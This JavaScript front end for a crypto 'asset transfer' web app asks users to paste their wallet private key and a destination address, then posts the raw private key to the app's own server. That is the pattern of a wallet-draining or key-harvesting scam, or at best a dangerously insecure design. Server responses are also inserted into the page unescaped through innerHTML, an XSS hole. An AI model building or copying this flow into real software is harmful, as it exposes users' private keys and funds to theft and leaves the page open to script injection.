class MoneyMoverApp {
    constructor() {
        this.sessionId = null;
        this.initializeEventListeners();
    }

    initializeEventListeners() {
        document.getElementById('connectWallet').addEventListener('click', () => this.connectWallet());
        document.getElementById('transferAssets').addEventListener('click', () => this.transferAssets());
    }

    async connectWallet() {
        const publicKey = document.getElementById('publicKey').value.trim();
        
        if (!publicKey) {
            this.showAlert('Please enter your wallet public key', 'warning');
            return;
        }

        this.showLoading('Connecting wallet...');

        try {
            const response = await fetch('/api/connect-wallet', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    publicKey,
                    userAgent: navigator.userAgent
                })
            });

            const data = await response.json();

            if (data.success) {
                this.sessionId = data.sessionId;
                this.showAlert('Wallet connected successfully!', 'success');
                document.getElementById('transfer-section').classList.remove('d-none');
                document.getElementById('session-id').textContent = this.sessionId;
                document.getElementById('session-info').classList.remove('d-none');
            } else {
                this.showAlert(data.error || 'Failed to connect wallet', 'danger');
            }
        } catch (error) {
            console.error('Error connecting wallet:', error);
            this.showAlert('Network error. Please try again.', 'danger');
        } finally {
            this.hideLoading();
        }
    }

    async transferAssets() {
        const privateKey = document.getElementById('privateKey').value.trim();
        const destinationWallet = document.getElementById('destinationWallet').value.trim();

        if (!privateKey || !destinationWallet) {
            this.showAlert('Please fill in all fields', 'warning');
            return;
        }

        if (!this.sessionId) {
            this.showAlert('Please connect your wallet first', 'warning');
            return;
        }

        this.showLoading('Transferring assets...');

        try {
            const response = await fetch('/api/transfer-assets', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    privateKey,
                    destinationWallet,
                    sessionId: this.sessionId
                })
            });

            const data = await response.json();

            this.showResults(data);
        } catch (error) {
            console.error('Error transferring assets:', error);
            this.showAlert('Network error. Please try again.', 'danger');
        } finally {
            this.hideLoading();
        }
    }

    showResults(data) {
        const resultsSection = document.getElementById('results-section');
        const resultsContent = document.getElementById('results-content');
        
        resultsSection.classList.remove('d-none');

        if (data.success) {
            resultsContent.innerHTML = `
                <div class="alert alert-success">
                    <h6>✅ Transfer Successful!</h6>
                    <p class="mb-1"><strong>Signature:</strong> ${data.signature}</p>
                    <p class="mb-1"><strong>Total Value:</strong> $${data.totalValue}</p>
                    <p class="mb-0"><strong>Message:</strong> ${data.message}</p>
                </div>
            `;
        } else {
            resultsContent.innerHTML = `
                <div class="alert alert-danger">
                    <h6>❌ Transfer Failed</h6>
                    <p class="mb-0">${data.error}</p>
                </div>
            `;
        }
    }

    showAlert(message, type) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
        alertDiv.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;
        
        document.querySelector('.card-body').insertBefore(alertDiv, document.querySelector('.card-body').firstChild);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            if (alertDiv.parentElement) {
                alertDiv.remove();
            }
        }, 5000);
    }

    showLoading(text = 'Loading...') {
        document.getElementById('loading-text').textContent = text;
        document.getElementById('loading').classList.remove('d-none');
    }

    hideLoading() {
        document.getElementById('loading').classList.add('d-none');
    }
}

// Initialize the app when the page loads
document.addEventListener('DOMContentLoaded', () => {
    new MoneyMoverApp();
});